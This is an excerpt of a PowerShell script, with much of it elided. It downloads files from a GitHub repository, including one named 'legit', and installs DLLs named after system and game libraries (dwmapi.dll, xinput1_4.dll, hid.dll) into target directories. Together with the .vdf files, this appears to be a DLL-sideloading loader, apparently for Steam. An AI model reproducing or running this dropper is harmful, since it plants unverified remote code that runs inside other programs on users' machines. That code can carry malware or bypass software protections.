...
try {
    ...
    if ($is64Bit) {
        ...
        DownloadFile -url 'https://github.com/1cdk-run/aa/raw/master/64/legit64' -savePath $savePathZip -hash '25FEAF232EF2D5626E5E71913DAB210D' 
    }
    else {
        $savePathZip = Join-Path $targetDirectory "legit"
        DownloadFile -url 'https://github.com/1cdk-run/aa/raw/master/legit' -savePath $savePathZip -hash '9B2FF8684E3C886C8FCDF83053D28F35' 
    }
    ...
    if ($is64Bit) {
        ...
        DownloadFile -url 'https://github.com/1cdk-run/aa/raw/master/64/1/appdata.vdf' -savePath $savePathVdf -hash 'D503089A6EE3FA581960C7DEB76EC406' 
        DownloadFile -url 'https://github.com/1cdk-run/aa/raw/master/64/1/dwmapi.dll' -savePath $savePathTxt -hash '52A446AF9DBB1288E5DAD77AFD5F8B05' -targetPath $d_path 
        DownloadFile -url 'https://github.com/1cdk-run/aa/raw/master/64/1/xinput1_4.dll' -savePath $savePathTxt1 -hash '24B1A2852D9B7523C54153C410B3B81F' -targetPath $d_path1 
        ...
        DownloadFile -url 'https://github.com/1cdk-run/aa/raw/master/1/localData.vdf' -savePath $savePathVdf -hash '6D4A87B255A30198DF09F71DE56D45B8' 
        DownloadFile -url 'https://github.com/1cdk-run/aa/raw/master/1/hid.dll' -savePath $savePathTxt -hash '27211F8430BF0DBDE26CA376F1A6CFDE' -targetPath $d_path 
    }
